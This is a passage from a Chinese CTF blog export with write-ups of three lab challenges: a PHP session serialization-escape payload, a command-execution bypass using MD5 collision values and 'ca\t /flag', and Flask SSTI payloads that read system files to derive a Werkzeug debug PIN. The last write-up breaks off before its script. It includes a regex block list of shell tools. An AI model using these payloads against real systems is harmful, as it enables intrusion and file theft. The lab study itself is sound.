<p>我萌发现unset函数将$_SESSION销毁了</p>
<p>然后重新赋予$_SESSION了新的值。</p>
<p>最后调用了extract($_POST);</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">extract</span><span class="hljs-params">()</span></span> 函数从数组中将变量导入到当前的符号表。<br></code></pre></td></tr></table></figure>

<h5 id="举例extract-变量覆盖"><a href="#举例extract-变量覆盖" class="headerlink" title="举例extract()变量覆盖"></a>举例extract()变量覆盖</h5><p>根据extract()我们可以进行变量覆盖，</p>
<p>当我们传入SESSION[flag]=123时，$SESSION[“user”]和$SESSION[‘function’] 全部会消失。</p>
<p>只剩下_SESSION[flag]=123。</p>
<p><img src="/2021/08/19/2021/buu/14/1947190-20200419170914367-953947353.png" alt="img"></p>
<h6 id="键值逃逸"><a href="#键值逃逸" class="headerlink" title="键值逃逸"></a>键值逃逸</h6><p>原理:因为序列化后的字符串是严格的，对应的格式不能错，比如s:4:”name”,那s:4就必须有一个字符串长度是4的否则就往后截取</p>
<p>并且unserialize会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#正规序列化的字符串</span><br>$a = <span class="hljs-string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;&quot;</span>;<br>var_dump(unserialize($a));<br><span class="hljs-comment">#带有多余的字符的字符串</span><br>$a_laji = <span class="hljs-string">&quot;a:2:&#123;s:3:\&quot;one\&quot;;s:4:\&quot;flag\&quot;;s:3:\&quot;two\&quot;;s:4:\&quot;test\&quot;;&#125;;s:3:\&quot;真的垃圾img\&quot;;lajilaji&quot;</span>;<br>var_dump(unserialize($a_laji));<br></code></pre></td></tr></table></figure>

<p>有了这个逃逸概念的话，就大概可以理解了。</p>
<p>如果我们把$_SESSION[‘img’] = base64_encode(‘guest_img.png’);这段代码的img属性放到花括号外边去</p>
<p>然后花括号中注好新的img属性，那么他本来要求的img属性就被咱们替换了。</p>
<p>payload：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;xxxxxxx&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>



<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_SESSION</span>[phpflag]=;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;phpflagphpflag&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;xxxxxxx&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;img&quot;</span>;s:<span class="hljs-number">20</span>:<span class="hljs-string">&quot;L2QwZzNfZmxsbGxsbGFn&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/19/2021/buu/14/image-20210819210654326.png" alt="image-20210819210654326"></p>
<p><img src="/2021/08/19/2021/buu/14/image-20210819210523566.png" alt="image-20210819210523566"></p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>安洵杯 2019 easy_web</title>
    <url>/2021/08/08/2021/buu/10/</url>
    <content><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><h5 id="MD5碰撞的一些例子"><a href="#MD5碰撞的一些例子" class="headerlink" title="MD5碰撞的一些例子"></a>MD5碰撞的一些例子</h5><p><a href="https://www.jianshu.com/p/c9089fd5b1ba">https://www.jianshu.com/p/c9089fd5b1ba</a></p>
<h5 id="PHP代码安全【PHP弱口令、加密函数、绕过函数】-CTF代码审计题"><a href="#PHP代码安全【PHP弱口令、加密函数、绕过函数】-CTF代码审计题" class="headerlink" title="PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题"></a>PHP代码安全【PHP弱口令、加密函数、绕过函数】/CTF代码审计题</h5><p><a href="https://sp4rkw.blog.csdn.net/article/details/79088218">https://sp4rkw.blog.csdn.net/article/details/79088218</a></p>
<h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p>靶机启动：</p>
<p><img src="/2021/08/08/2021/buu/10/image-20210809085159186.png" alt="image-20210809085159186"></p>
<p>观察到url路径存在参数</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile">?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;<span class="hljs-keyword">cmd</span><span class="bash">=</span><br></code></pre></td></tr></table></figure>

<p>感觉这里就是切入点，img背后的似乎是base64码</p>
<p>在线解码一下（<a href="https://base64.us/%EF%BC%89%EF%BC%9A">https://base64.us/）：</a></p>
<p>TXpVek5UTTFNbVUzTURabE5qYz0</p>
<p>MzUzNTM1MmU3MDZlNjc=</p>
<p>3535352e706e67</p>
<p>连续两次base64解码后，得到一串字符串</p>
<p>查了资料，这是hex编码</p>
<p><img src="/2021/08/08/2021/buu/10/image-20210809085725782.png" alt="image-20210809085725782"></p>
<p>再次解码：得到555.png，有意思</p>
<p>刚好靶机页面上就有一张哭泣图片</p>
<p>我们猜测，img后面的多次编码的参数请求可以得到源码</p>
<p>按照上面的解码逆推编码，可以得到</p>
<p>index.php:</p>
<p>696E6465782E706870</p>
<p>Njk2RTY0NjU3ODJFNzA2ODcw</p>
<p>TmprMlJUWTBOalUzT0RKRk56QTJPRGN3</p>
<p>将参数修改</p>
<p><img src="/2021/08/08/2021/buu/10/image-20210809090352667.png" alt="image-20210809090352667"></p>
<p>f12查看</p>
<p><img src="/2021/08/08/2021/buu/10/image-20210809090426959.png" alt="image-20210809090426959"></p>
<p>对base64解码得到源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(E_ALL || ~ E_NOTICE);<br>header(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<br>$cmd = $_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>])) <br>    header(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<br>$file = hex2bin(base64_decode(base64_decode($_GET[<span class="hljs-string">&#x27;img&#x27;</span>])));<br><br>$file = preg_replace(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, $file);<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/flag/i&quot;</span>, $file)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixi～ no flag&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    $txt = base64_encode(file_get_contents($file));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . $txt . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-keyword">echo</span> $cmd;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, $cmd)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)$_POST[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)$_POST[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `$cmd`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<h5 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h5><figure class="highlight latex"><table><tr><td class="code"><pre><code class="hljs latex">preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|<span class="hljs-tag">\<span class="hljs-name">&#x27;</span></span>|<span class="hljs-tag">\<span class="hljs-name">&quot;</span></span>|<span class="hljs-tag">\<span class="hljs-name">`</span></span>|;|,|<span class="hljs-tag">\<span class="hljs-name">*</span></span>|<span class="hljs-tag">\<span class="hljs-name">?</span></span>|<span class="hljs-tag">\<span class="hljs-name">\</span></span>|<span class="hljs-tag">\<span class="hljs-name">\</span></span><span class="hljs-tag">\<span class="hljs-name">\</span></span>|<span class="hljs-tag">\<span class="hljs-name">n</span></span>|<span class="hljs-tag">\<span class="hljs-name">t</span></span>|<span class="hljs-tag">\<span class="hljs-name">r</span></span>|<span class="hljs-tag">\<span class="hljs-name">xA</span></span>0|<span class="hljs-tag">\<span class="hljs-name">&#123;</span></span>|<span class="hljs-tag">\<span class="hljs-name">&#125;</span></span>|<span class="hljs-tag">\<span class="hljs-name">(</span></span>|<span class="hljs-tag">\<span class="hljs-name">)</span></span>|<span class="hljs-tag">\<span class="hljs-name">&amp;</span><span class="hljs-string">[^\d]</span></span>|@|<span class="hljs-tag">\<span class="hljs-name">|</span></span>|<span class="hljs-tag">\<span class="hljs-name">\</span></span><span class="hljs-formula">$|<span class="hljs-tag">\<span class="hljs-name">[</span></span>|<span class="hljs-tag">\<span class="hljs-name">]</span></span>|&#123;|&#125;|<span class="hljs-tag">\<span class="hljs-name">(</span></span>|<span class="hljs-tag">\<span class="hljs-name">)</span></span>|-|&lt;|&gt;/i&quot;, $</span>cmd<br></code></pre></td></tr></table></figure>

<p>这里对cmd的值进行了正则过滤，一般的l像s指令都不可以用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)$_POST[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)$_POST[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>       <span class="hljs-keyword">echo</span> `$cmd`;<br>   &#125; <span class="hljs-keyword">else</span> &#123;<br>       <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>这里说明我们需要POST两个变量：a和b</p>
<p>它们作为字符串时的值弱比较不相等，md5加密的值强比较要相等（<strong>md5碰撞</strong>）</p>
<p>这里不太理解，所以先直接抄了wp的md5值</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">a=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%00</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%55</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span>&amp;b=<span class="hljs-symbol">%4</span>d<span class="hljs-symbol">%c9</span><span class="hljs-symbol">%68</span><span class="hljs-symbol">%ff</span><span class="hljs-symbol">%0</span>e<span class="hljs-symbol">%e3</span><span class="hljs-symbol">%5</span><span class="hljs-keyword">c</span><span class="hljs-symbol">%20</span><span class="hljs-symbol">%95</span><span class="hljs-symbol">%72</span><span class="hljs-symbol">%d4</span><span class="hljs-symbol">%77</span><span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%72</span><span class="hljs-symbol">%15</span><span class="hljs-symbol">%87</span><span class="hljs-symbol">%d3</span><span class="hljs-symbol">%6</span>f<span class="hljs-symbol">%a7</span><span class="hljs-symbol">%b2</span><span class="hljs-symbol">%1</span>b<span class="hljs-symbol">%dc</span><span class="hljs-symbol">%56</span><span class="hljs-symbol">%b7</span><span class="hljs-symbol">%4</span>a<span class="hljs-symbol">%3</span>d<span class="hljs-symbol">%c0</span><span class="hljs-symbol">%78</span><span class="hljs-symbol">%3</span>e<span class="hljs-symbol">%7</span>b<span class="hljs-symbol">%95</span><span class="hljs-symbol">%18</span><span class="hljs-symbol">%af</span><span class="hljs-symbol">%bf</span><span class="hljs-symbol">%a2</span><span class="hljs-symbol">%02</span><span class="hljs-symbol">%a8</span><span class="hljs-symbol">%28</span><span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%f3</span><span class="hljs-symbol">%6</span>e<span class="hljs-symbol">%8</span>e<span class="hljs-symbol">%4</span>b<span class="hljs-symbol">%55</span><span class="hljs-symbol">%b3</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%42</span><span class="hljs-symbol">%75</span><span class="hljs-symbol">%93</span><span class="hljs-symbol">%d8</span><span class="hljs-symbol">%49</span><span class="hljs-symbol">%67</span><span class="hljs-symbol">%6</span>d<span class="hljs-symbol">%a0</span><span class="hljs-symbol">%d1</span><span class="hljs-symbol">%d5</span><span class="hljs-symbol">%5</span>d<span class="hljs-symbol">%83</span><span class="hljs-symbol">%60</span><span class="hljs-symbol">%fb</span><span class="hljs-symbol">%5</span>f<span class="hljs-symbol">%07</span><span class="hljs-symbol">%fe</span><span class="hljs-symbol">%a2</span><br></code></pre></td></tr></table></figure>

<p>POST传参</p>
<p>这里最好不要用hackbar，因为hackbar好像会把md5值再编码</p>
<p>（这个地方坑了我好久）</p>
<p>在请求到包后，直接在bp里改包</p>
<p>原来的GET请求直接改成POST请求</p>
<p><img src="/2021/08/08/2021/buu/10/image-20210809092901502.png" alt="image-20210809092901502"></p>
<p>使用还没被ban掉的dir指令</p>
<p>查询到文件</p>
<p><img src="/2021/08/08/2021/buu/10/image-20210809092634318.png" alt="image-20210809092634318"></p>
<p>然后直接用了多数博客都使用的绕过方法</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile">?<span class="hljs-keyword">cmd</span><span class="bash">=ca\t%20/flag</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/08/2021/buu/10/image-20210809093215609.png" alt="image-20210809093215609"></p>
<p>看网上还有一种方法读取flag：</p>
<p>sort命令：sort将文件的每一行作为一个单位，相互比较，比较原则是从首字符向后，依次按ASCII码值进行比较，最后将他们按升序输出。</p>
<p><img src="/2021/08/08/2021/buu/10/1625650-20200130214928556-987685402.png" alt="img"></p>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.cnblogs.com/wangtanzhi/p/12244096.html">https://www.cnblogs.com/wangtanzhi/p/12244096.html</a></p>
<p><a href="https://blog.csdn.net/qq_43622442/article/details/106012150">https://blog.csdn.net/qq_43622442/article/details/106012150</a></p>
]]></content>
      <categories>
        <category>CTF·rce</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>GYCTF2020 FlaskApp</title>
    <url>/2021/09/01/2021/buu/17/</url>
    <content><![CDATA[<p><a href="https://www.jianshu.com/p/cbca419ba075">flask框架下的ssti+pin码执行命令 - 简书 (jianshu.com)</a></p>
<p>[<a href="https://blog.csdn.net/SopRomeo/article/details/105875248">GYCTF2020]FlaskApp_SopRomeo的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/Alexhcf/article/details/108400293">(1条消息) GYCTF2020 FlaskApp_汗的博客-CSDN博客</a></p>
<p>最近刚学了模板注入，这题就直接顺着flask的payload去</p>
<p>打payload时要注意输入一整行内容</p>
<p><img src="/2021/09/01/2021/buu/17/image-20210901155839298.png" alt="image-20210901155839298"></p>
<p>试着用简单的payload</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">2</span>+<span class="hljs-number">2</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>

<p>经过加密解密提交后</p>
<p><img src="/2021/09/01/2021/buu/17/image-20210901160005521.png" alt="image-20210901160005521"></p>
<p>再尝试用system函数</p>
<figure class="highlight handlebars"><table><tr><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls&#x27;</span>)&#125;</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/01/2021/buu/17/image-20210901160203877.png" alt="image-20210901160203877"></p>
<p>好家伙，果然被过滤了</p>
<p>试了几个关键字都不行后，查看提示，在源码处看到</p>
<p><img src="/2021/09/01/2021/buu/17/image-20210901160310325.png" alt="image-20210901160310325"></p>
<p>看到PIN</p>
<p>果断上网查了文章，发现PIN还挺难得到的</p>
<p>主要是python脚本不会写。。。</p>
<p>接下来按照正常解题流程：</p>
<h4 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h4><p>payload1获取mac地址</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;/sys/class/net/eth0/address&#x27;</span>,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="/2021/09/01/2021/buu/17/image-20211028183617395.png" alt="image-20211028183617395"></p>
<p>进行16进制到10进制的转换<a href="https://gchq.github.io/CyberChef/">https://gchq.github.io/CyberChef/</a></p>
<p>或者python代码实现</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">print</span>(int(&#x27;<span class="hljs-number">02</span>:<span class="hljs-number">42</span>:ac:<span class="hljs-number">10</span>:<span class="hljs-number">8</span>a:db&#x27;,<span class="hljs-number">16</span>))<br></code></pre></td></tr></table></figure>

<p>得到：2485377862363</p>
<p>接着获取id，读取<code>/proc/self/cgroup</code></p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><code class="hljs clojure">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(<span class="hljs-name">&#x27;/proc/self/cgroup&#x27;</span>,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>

<p>得到</p>
<p><img src="/2021/09/01/2021/buu/17/image-20211028183832593.png" alt="image-20211028183832593"></p>
<p>即</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><code class="hljs llvm">结果 ： <span class="hljs-number">12</span>:pids:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">11</span>:devices:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">10</span>:rdma:/ <span class="hljs-number">9</span>:memory:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">8</span>:blkio:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">7</span>:cpu,cpuacct:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">6</span>:net_cls,net_prio:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">5</span>:hugetlb:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">4</span>:cpuset:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">3</span>:perf_event:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">2</span>:freezer:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">1</span>:name=systemd:/docker/<span class="hljs-number">194</span>fc<span class="hljs-number">0</span>dd<span class="hljs-number">10</span>ec<span class="hljs-number">5710</span><span class="hljs-keyword">c</span><span class="hljs-number">44</span><span class="hljs-keyword">cc</span><span class="hljs-number">4933</span>a<span class="hljs-number">001404389</span><span class="hljs-keyword">c</span><span class="hljs-number">65e89</span><span class="hljs-keyword">c</span><span class="hljs-number">26</span><span class="hljs-keyword">c</span><span class="hljs-number">57</span>b<span class="hljs-number">0</span>b<span class="hljs-number">654960</span>ee<span class="hljs-number">618</span>b<span class="hljs-number">38</span> <span class="hljs-number">0</span>::/system.slice/containerd.service<br></code></pre></td></tr></table></figure>

<p>将得到的机器id和mac地址放进脚本跑pin码</p>
<p>脚本</p>
